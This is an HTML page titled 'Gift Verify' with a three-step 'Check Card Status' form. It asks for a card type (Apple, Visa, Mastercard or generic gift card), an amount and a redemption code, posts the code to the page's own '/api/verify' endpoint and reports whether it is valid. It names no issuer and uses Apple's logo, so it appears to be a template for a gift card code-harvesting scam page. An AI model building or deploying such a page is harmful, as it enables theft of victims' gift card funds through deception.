<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Gift Verify</title>

<style>
body {
  margin: 0;
  font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto;
  background: #f1f5f9;
}

.header {
  background: linear-gradient(90deg, #6d28d9, #4f46e5);
  padding: 18px;
  color: white;
  font-size: 20px;
  font-weight: bold;
  display: flex;
  justify-content: space-between;
}

.container {
  background: white;
  margin: -20px auto 20px;
  padding: 25px;
  border-radius: 15px;
  width: 90%;
  max-width: 400px;
  box-shadow: 0 10px 30px rgba(0,0,0,0.1);
}

.logo {
  text-align: center;
  margin-bottom: 10px;
}

input, select {
  width: 100%;
  padding: 12px;
  margin-top: 8px;
  border-radius: 8px;
  border: 1px solid #cbd5e1;
}

button {
  margin-top: 20px;
  width: 100%;
  padding: 14px;
  background: #4f46e5;
  color: white;
  border: none;
  border-radius: 10px;
  font-weight: bold;
}

.step { display: none; text-align: center; }
.step.active { display: block; }

.loader {
  border: 4px solid #e2e8f0;
  border-top: 4px solid #4f46e5;
  border-radius: 50%;
  width: 35px;
  height: 35px;
  margin: 40px auto;
  animation: spin 1s linear infinite;
}

.success { color: green; }
.error { color: red; }

@keyframes spin {
  100% { transform: rotate(360deg); }
}
</style>
</head>

<body>

<div class="header">
  <div>✔ Gift Verify</div>
  <div>☰</div>
</div>

<!-- STEP 1 -->
<div class="container step active" id="step1">

  <div id="cardLogo" class="logo"></div>

  <h1>Check Card Status</h1>

  <label>Card Type</label>
  <select id="cardType" onchange="updateUI()">
    <option value="generic">Gift Card</option>
    <option value="visa">Visa</option>
    <option value="mastercard">Mastercard</option>
    <option value="apple">Apple</option>
  </select>

  <label>Currency</label>
  <select>
    <option>USD</option>
    <option>EUR</option>
    <option>GBP</option>
  </select>

  <label>Card Amount</label>
  <input id="amount" placeholder="e.g. 100">

  <label>Redemption Code</label>
  <input id="code"
    placeholder="Enter code"
    oninput="this.value = this.value.toUpperCase().replace(/[^A-Z0-9]/g,'')">

  <button onclick="goToVerify()">Check Status</button>

  <div id="errorMsg" class="error"></div>

</div>

<!-- STEP 2 -->
<div class="step" id="step2">
  <h2>Verifying...</h2>
  <div class="loader"></div>
</div>

<!-- STEP 3 -->
<div class="container step" id="step3">
  <h2 id="resultTitle"></h2>
  <p id="resultText"></p>
  <button onclick="reset()">Try Again</button>
</div>

<script>
// Apple logo
const appleLogo = `
<svg viewBox="0 0 24 24" width="40" height="40" fill="black" style="display:block;margin:auto;">
  <path d="M16.365 1.43c0 1.14-.463 2.24-1.21 3.02-.79.83-2.07 1.47-3.2 1.39-.14-1.08.42-2.23 1.18-3.01.83-.86 2.22-1.48 3.23-1.4zM20.5 17.08c-.37.84-.82 1.62-1.34 2.33-.71.97-1.29 1.64-1.75 2.01-.71.61-1.47.92-2.29.95-.59 0-1.3-.17-2.13-.52-.84-.35-1.61-.52-2.32-.52-.74 0-1.53.17-2.36.52-.83.35-1.5.54-2.02.56-.79.03-1.56-.3-2.3-.99-.47-.4-1.08-1.1-1.82-2.1-.79-1.06-1.44-2.3-1.96-3.73-.56-1.54-.84-3.03-.84-4.47 0-1.65.36-3.07 1.07-4.26.56-.96 1.31-1.72 2.24-2.27.93-.55 1.93-.83 3-.85.63 0 1.45.2 2.47.6 1.01.4 1.66.6 1.95.6.21 0 .91-.22 2.09-.66 1.12-.41 2.07-.58 2.85-.52 2.12.17 3.72 1.01 4.78 2.51-1.9 1.15-2.84 2.76-2.82 4.82.02 1.61.6 2.95 1.74 4.02.52.5 1.1.88 1.75 1.14-.14.4-.29.79-.46 1.16z"/>
</svg>
`;

function updateUI() {
  const type = document.getElementById("cardType").value;
  const logo = document.getElementById("cardLogo");

  if (type === "apple") {
    logo.innerHTML = appleLogo;
  } else {
    logo.innerHTML = "";
  }
}

function validateCode(code, type) {
  // make Apple behave like others
  if (type === "apple") return /^[A-Z0-9]{4,}$/.test(code);
  if (type === "visa") return /^[A-Z0-9]{12,16}$/.test(code);
  if (type === "mastercard") return /^[A-Z0-9]{10,16}$/.test(code);

  return /^[A-Z0-9]{4,}$/.test(code);
}

async function goToVerify() {
  const code = document.getElementById("code").value;
  const type = document.getElementById("cardType").value;
  const error = document.getElementById("errorMsg");

  if (!validateCode(code, type)) {
    error.textContent = "Invalid code format";
    return;
  }

  error.textContent = "";
  showStep("step2");

  try {
    const res = await fetch("/api/verify", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ code })
    });

    const data = await res.json();

    showStep("step3");

    if (data.success) {
      resultTitle.textContent = "Valid Code";
      resultTitle.className = "success";
      resultText.textContent = type.toUpperCase() + " card verified";
    } else {
      resultTitle.textContent = "Invalid Code";
      resultTitle.className = "error";
      resultText.textContent = "Please try again";
    }

  } catch (err) {
    showStep("step3");
    resultTitle.textContent = "Error";
    resultText.textContent = "Request failed";
  }
}

function showStep(id) {
  document.querySelectorAll(".step").forEach(s => s.classList.remove("active"));
  document.getElementById(id).classList.add("active");
}

function reset() {
  document.getElementById("code").value = "";
  document.getElementById("amount").value = "";
  showStep("step1");
}
</script>

</body>
</html>
